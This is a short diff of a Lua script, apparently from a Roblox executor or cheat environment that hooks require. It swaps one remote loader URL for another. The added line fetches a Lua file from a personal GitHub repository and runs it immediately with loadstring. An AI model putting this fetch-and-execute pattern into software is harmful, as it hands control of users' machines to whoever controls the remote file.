@@ -354,4 +354,6 @@ getgenv().require = newcclosure(function(v)
     end
 end)
 
-loadstring(httpget("https://pastebin.com/raw/z3xBKccm"))()
+loadstring(httpget("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
+
+print("loaded init script!")
